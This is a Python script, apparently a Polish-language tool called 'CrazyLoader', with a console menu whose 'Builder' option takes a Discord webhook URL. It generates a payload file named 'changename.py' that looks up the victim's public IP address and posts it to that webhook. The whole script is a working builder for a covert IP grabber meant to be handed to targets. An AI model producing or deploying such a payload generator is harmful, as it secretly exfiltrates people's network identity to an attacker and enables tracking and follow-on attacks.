import os
import sys
import requests
from colorama import init, Fore, Style
from rich.console import Console
from rich.text import Text

# Inicjalizacja konsoli
init(autoreset=True)
console = Console()

def display_ascii_gradient():
    """Wyświetla gradientowe ASCII CrazyLoader."""
    ascii_art = r"""
 ██████╗██████╗  █████╗ ███████╗██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗██████╗ 
██╔════╝██╔══██╗██╔══██╗╚══███╔╝██║   ██║██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║     ██████╔╝███████║  ███╔╝ ██║   ██║██║     ██║   ██║███████║██████╔╝█████╗  ██████╔╝
██║     ██╔═══╝ ██╔══██║ ███╔╝  ██║   ██║██║     ██║   ██║██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
╚██████╗██║     ██║  ██║███████╗╚██████╔╝███████╗╚██████╔╝██║  ██║██║     ███████╗██║  ██║
 ╚═════╝╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝                                                                              
"""
    lines = ascii_art.strip("\n").splitlines()
    for i, line in enumerate(lines):
        red_value = int(255 * (1 - i / len(lines)))
        color = f"rgb({red_value},0,0)"
        console.print(Text(line, style=f"bold {color}"))

def get_output_path():
    """Zwraca ścieżkę do folderu output w ../crazyip/output"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_dir = os.path.join(script_dir, "..", "crazyip", "output")
    os.makedirs(output_dir, exist_ok=True)
    return output_dir

def validate_webhook(webhook: str) -> bool:
    """Waliduje poprawność webhooka"""
    return webhook.startswith("https://") and "discord.com/api/webhooks" in webhook

def generate_payload_code(webhook_url: str) -> str:
    """Zwraca kod Pythona do wysyłania IP na webhook"""
    return f'''import requests

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "IP: Błąd pobierania"

def send_ip_to_webhook(webhook):
    ip = get_public_ip()
    data = {{
        "content": f"IP użytkownika: {{ip}}"
    }}
    try:
        requests.post(webhook, json=data)
    except Exception as e:
        print("Błąd wysyłania do webhooka:", e)

if __name__ == "__main__":
    send_ip_to_webhook("{webhook_url}")
'''

def create_payload_file(output_dir: str, webhook: str):
    """Tworzy plik changename.py w folderze output"""
    file_path = os.path.join(output_dir, "changename.py")
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(generate_payload_code(webhook))
    return file_path

def show_menu():
    console.print("\n[bold red]1.[/bold red] Builder\n")
    choice = input(Fore.RED + "Wybierz opcję (1): " + Style.RESET_ALL).strip()
    
    if choice == '1':
        webhook = input("\nPodaj webhook Discord: ").strip()
        if not validate_webhook(webhook):
            console.print("[bold red]❌ Błąd: Niepoprawny webhook.[/bold red]")
            input("\nNaciśnij Enter, aby wrócić...")
            return

        try:
            output_path = get_output_path()
            payload_path = create_payload_file(output_path, webhook)
            console.print(f"\n[bold green]✅ Sukces:[/bold green] Plik został zapisany jako [bold]{payload_path}[/bold]")
        except Exception as e:
            console.print(f"[bold red]❌ Błąd przy tworzeniu pliku: {e}[/bold red]")

        input("\nNaciśnij Enter, aby kontynuować...")
    else:
        console.print("[bold red]❌ Nieprawidłowa opcja![/bold red]")
        input("\nNaciśnij Enter, aby kontynuować...")

def main():
    os.system("cls" if os.name == "nt" else "clear")
    display_ascii_gradient()
    show_menu()

if __name__ == "__main__":
    main()
